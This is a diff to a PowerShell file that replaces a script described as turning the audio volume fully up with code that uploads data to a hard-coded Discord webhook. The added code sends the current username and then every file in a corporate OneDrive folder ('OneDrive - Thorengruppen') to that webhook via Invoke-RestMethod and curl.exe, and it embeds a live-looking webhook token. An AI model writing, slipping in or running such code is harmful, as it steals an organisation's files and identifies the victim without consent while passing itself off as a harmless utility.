@@ -1,23 +1,29 @@
-﻿<#
-.SYNOPSIS
-	Turns the volume fully up
-.DESCRIPTION
-	This PowerShell script turns the audio volume fully up to 100%.
-.EXAMPLE
-	PS> ./turn-volume-fully-up
-.LINK
-	https://github.com/fleschutz/PowerShell
-.NOTES
-	Author: Markus Fleschutz | License: CC0
-#>
+function Upload-Discord {
 
-try {
-	$obj = New-Object -com wscript.shell
-	for ([int]$i = 0; $i -lt 100; $i += 2) {
-		$obj.SendKeys([char]175) # each tick is +2%
-	}
-	exit 0 # success
-} catch {
-	"⚠️ Error in line $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
-	exit 1
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = 'https://discord.com/api/webhooks/1143906605516210287/M-2zRPPcRUwdPjQIFsNxUY0sFjSoynHWiLfFNRq0pfVGOoLfk7YiuBsUhZ1AHPm3V7px'
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+$paths = Get-ChildItem -path "OneDrive - Thorengruppen"
+Get-ChildItem -path "OneDrive - Thorengruppen"
+foreach ($path in $paths){
+  Upload-Discord -file "OneDrive - Thorengruppen\$path"
+  $path
 }
